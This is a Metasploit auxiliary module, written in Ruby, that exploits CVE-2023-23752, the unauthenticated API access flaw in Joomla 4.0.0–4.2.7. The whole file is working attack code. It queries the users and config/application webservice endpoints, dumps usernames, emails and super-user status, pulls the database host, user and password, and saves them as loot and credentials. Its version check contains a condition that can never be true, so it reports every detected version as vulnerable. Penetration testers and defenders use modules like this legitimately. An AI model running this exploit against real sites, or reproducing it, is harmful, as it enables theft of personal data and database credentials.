##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HTTP::Joomla

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Joomla API Improper Access Checks',
        'Description' => %q{
          Joomla versions between 4.0.0 and 4.2.7, inclusive, contain an improper API access vulnerability.
          This vulnerability allows unauthenticated users access to webservice endpoints which contain
          sensitive information. Specifically for this module we exploit the users and config/application
          endpoints.

          This module was tested against Joomla 4.2.7 running on Docker.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # msf module
          'Tianji Lab', # original PoC, analysis
        ],
        'References' => [
          ['EDB', '51334'],
          ['URL', 'https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html'],
          ['URL', 'https://nsfocusglobal.com/joomla-unauthorized-access-vulnerability-cve-2023-23752-notice/'],
          ['URL', 'https://attackerkb.com/topics/18qrh3PXIX/cve-2023-23752'],
          ['CVE', '2023-23752'],
        ],
        'Targets' => [
          ['Joomla 4.0.0 - 4.2.7', {}],
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        },
        'DisclosureDate' => '2023-02-01',
        'DefaultTarget' => 0
      )
    )
    # set the default port, and a URI that a user can set if the app isn't installed to the root
    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [true, 'The URI of the Joomla Application', '/']),
      ]
    )
  end

  def check_host(_ip)
    unless joomla_and_online?
      return Exploit::CheckCode::Unknown("#{peer} - Could not connect to web service or not detected as Joomla")
    end

    version = joomla_version
    if version.nil?
      return Exploit::CheckCode::Safe("#{peer} - Unable to determine Joomla Version")
    end

    vprint_status("Joomla version detected: #{version}")
    ver_no = Rex::Version.new(version)
    if ver_no < Rex::Version.new('4.0.0') && ver_no >= Rex::Version.new('4.2.8')
      return Exploit::CheckCode::Safe("Joomla version #{ver_no} is NOT vulnerable")
    end

    Exploit::CheckCode::Appears("Joomla version #{ver_no} is vulnerable")
  end

  def run_host(ip)
    vprint_status('Attempting user enumeration')
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'api', 'index.php', 'v1', 'users'),
      'headers' => {
        # header is needed, it passes back JSON anyways.
        'Accept' => '*/*'
      },
      'vars_get' => {
        'public' => 'true'
      }
    )
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Page didn't load correctly (response code: #{res.code})") unless res.code == 200

    tbl = Rex::Text::Table.new(
      'Header' => 'Joomla Users',
      'Indent' => 1,
      'Columns' => ['ID', 'Super User', 'Name', 'Username', 'Email', 'Send Email', 'Register Date', 'Last Visit Date', 'Group Names']
    )

    users = res.get_json_document
    fail_with(Failure::UnexpectedReply, 'JSON document not returned') unless users # < json data wasn't properly formatted
    fail_with(Failure::UnexpectedReply, "'data' field in JSON document not found") unless users['data'] # < json data was properly formatted by the expected key wasn't present

    loot_path = store_loot('joomla.users', 'application/json', ip, res.body, 'Joomla Users')
    print_good("Users JSON saved to #{loot_path}")

    users = users['data']
    users.each do |user|
      unless user['type'] == 'users'
        next
      end

      tbl << [
        user['attributes']['id'].to_s,
        user['attributes']['group_names'].include?('Super Users') ? '*' : '',
        user['attributes']['name'].to_s,
        user['attributes']['username'].to_s,
        user['attributes']['email'].to_s,
        user['attributes']['sendEmail'].to_s,
        user['attributes']['registerDate'].to_s,
        user['attributes']['lastvisitDate'].to_s,
        user['attributes']['group_names'].to_s,
      ]
    end

    print_good(tbl.to_s)

    vprint_status('Attempting config enumeration')
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'api', 'index.php', 'v1', 'config', 'application'),
      'headers' => {
        # header is needed, it passes back JSON anyways.
        'Accept' => '*/*'
      },
      'vars_get' => {
        'public' => 'true'
      }
    )

    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Page didn't load correctly (response code: #{res.code})") unless res.code == 200

    tbl = Rex::Text::Table.new(
      'Header' => 'Joomla Config',
      'Indent' => 1,
      'Columns' => ['Setting', 'Value']
    )

    config = res.get_json_document
    fail_with(Failure::UnexpectedReply, 'JSON document not returned') unless config # < json data wasn't properly formatted
    fail_with(Failure::UnexpectedReply, "'data' field in JSON document not found") unless config['data'] # < json data was properly formatted by the expected key wasn't present

    loot_path = store_loot('joomla.config', 'application/json', ip, res.body, 'Joomla Config')
    print_good("Config JSON saved to #{loot_path}")

    config = config['data']
    credential_data = {
      protocol: 'tcp',
      workspace_id: myworkspace_id,
      port: 1, # we dont get this data back so just set it to something obviously wrong instead of guessing
      origin_type: :service,
      private_type: :password,
      module_fullname: fullname,
      status: Metasploit::Model::Login::Status::UNTRIED
    }
    config.each do |setting|
      if setting['attributes'].key?('dbtype')
        credential_data[:service_name] = setting['attributes']['dbtype'].to_s
        if setting['attributes']['dbtype'].to_s == ''
          credential_data[:port] = '3306' # taking a guess since this info isn't returned but is required for create_credential_and_login
        end
        tbl << ['dbtype', setting['attributes']['dbtype'].to_s]
      elsif setting['attributes'].key?('host')
        credential_data[:address] = setting['attributes']['host'].to_s
        tbl << ['db host', setting['attributes']['host'].to_s]
      elsif setting['attributes'].key?('password')
        credential_data[:private_data] = setting['attributes']['password']
        tbl << ['db password', setting['attributes']['password'].to_s]
      elsif setting['attributes'].key?('user')
        credential_data[:username] = setting['attributes']['user'].to_s
        tbl << ['db user', setting['attributes']['user'].to_s]
      elsif setting['attributes'].key?('db')
        tbl << ['db name', setting['attributes']['db'].to_s]
      elsif setting['attributes'].key?('dbprefix')
        tbl << ['db prefix', setting['attributes']['dbprefix'].to_s]
      elsif setting['attributes'].key?('dbencryption')
        tbl << ['db encryption', setting['attributes']['dbencryption'].to_s]
      end
    end
    # if db host isn't a FQDN or IP, this will silently fail to save.
    create_credential_and_login(credential_data)

    print_good(tbl.to_s)
  end
end
